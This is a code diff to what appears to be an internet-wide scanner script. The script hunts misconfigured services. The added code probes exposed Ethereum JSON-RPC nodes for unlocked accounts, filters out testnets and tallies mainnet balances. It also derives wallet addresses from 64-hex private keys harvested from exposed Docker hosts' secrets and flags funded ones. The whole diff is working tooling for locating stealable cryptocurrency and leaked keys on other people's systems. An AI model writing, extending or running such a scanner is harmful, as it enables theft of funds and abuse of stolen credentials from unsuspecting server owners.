@@ -81,27 +81,68 @@ def probe_mongo(ip):
     except:
         return None
 
+MAINNET_RPC = 'https://eth.llamarpc.com'
+
+def privkey_to_balance(hex_key):
+    try:
+        from eth_account import Account
+        acct = Account.from_key('0x' + hex_key)
+        bal = eth_mainnet_balance(acct.address)
+        return acct.address, bal
+    except:
+        return None, 0
+
+def eth_mainnet_balance(addr):
+    try:
+        r = requests.post(MAINNET_RPC,
+            json={'jsonrpc': '2.0', 'method': 'eth_getBalance',
+                  'params': [addr, 'latest'], 'id': 1},
+            timeout=TIMEOUT)
+        return int(r.json().get('result', '0x0'), 16) / 1e18
+    except:
+        return 0
+
 def probe_eth(ip):
     try:
         r = requests.post(f'http://{ip}:8545',
             json={'jsonrpc': '2.0', 'method': 'eth_accounts', 'params': [], 'id': 1},
             timeout=TIMEOUT)
         accounts = r.json().get('result', [])
+        if not accounts:
+            return None
+
+        # Check chain ID — skip testnets
+        try:
+            chain_r = requests.post(f'http://{ip}:8545',
+                json={'jsonrpc': '2.0', 'method': 'eth_chainId', 'params': [], 'id': 1},
+                timeout=TIMEOUT)
+            chain_id = int(chain_r.json().get('result', '0x0'), 16)
+        except:
+            chain_id = 0
+
         result = {'ip': ip, 'port': 8545, 'type': 'eth',
-                  'accounts': accounts, 'balances': {}, 'total_eth': 0}
-        for addr in accounts[:10]:
-            bal = requests.post(f'http://{ip}:8545',
-                json={'jsonrpc': '2.0', 'method': 'eth_getBalance',
-                      'params': [addr, 'latest'], 'id': 1},
-                timeout=TIMEOUT).json().get('result', '0x0')
-            eth = int(bal, 16) / 1e18
-            result['balances'][addr] = eth
-            result['total_eth'] += eth
-        if result['total_eth'] > 0:
-            print(f'  ETH FUNDED: {ip} total={result["total_eth"]:.4f} ETH', flush=True)
-        elif accounts:
-            print(f'  ETH UNLOCKED (empty): {ip} accounts={accounts}', flush=True)
-        return result if accounts else None
+                  'chain_id': chain_id, 'accounts': accounts,
+                  'balances': {}, 'total_eth': 0}
+
+        if chain_id == 1:
+            # Real mainnet — check balances via local node
+            for addr in accounts[:10]:
+                try:
+                    bal = requests.post(f'http://{ip}:8545',
+                        json={'jsonrpc': '2.0', 'method': 'eth_getBalance',
+                              'params': [addr, 'latest'], 'id': 1},
+                        timeout=TIMEOUT).json().get('result', '0x0')
+                    eth = int(bal, 16) / 1e18
+                    result['balances'][addr] = eth
+                    result['total_eth'] += eth
+                except:
+                    pass
+            if result['total_eth'] > 0:
+                print(f'  MAINNET FUNDED: {ip} total={result["total_eth"]:.4f} ETH', flush=True)
+        else:
+            print(f'  ETH TESTNET: {ip} chain={chain_id} accounts={len(accounts)}', flush=True)
+
+        return result
     except:
         return None
 
@@ -129,6 +170,18 @@ def probe_docker(ip):
                     if secrets:
                         result['secrets'].extend(secrets)
                         print(f'  DOCKER SECRETS: {ip} image={image}: {e[:80]}', flush=True)
+                        # Derive ETH address from 64-char hex private keys, check mainnet balance
+                        for s in secrets:
+                            val = s.split('=')[-1].strip().strip('"\'')
+                            if len(val) == 64 and all(c in '0123456789abcdefABCDEF' for c in val):
+                                addr, bal = privkey_to_balance(val)
+                                if addr:
+                                    entry = {'key': val, 'address': addr, 'mainnet_eth': bal}
+                                    result.setdefault('eth_keys', []).append(entry)
+                                    if bal > 0:
+                                        print(f'  ETH KEY FUNDED: {ip} {addr} bal={bal:.4f} ETH', flush=True)
+                                    else:
+                                        print(f'  ETH KEY (empty): {ip} {addr}', flush=True)
             except:
                 pass
         print(f'  DOCKER: {ip} v={info.get("ServerVersion")} running={info.get("ContainersRunning",0)}', flush=True)
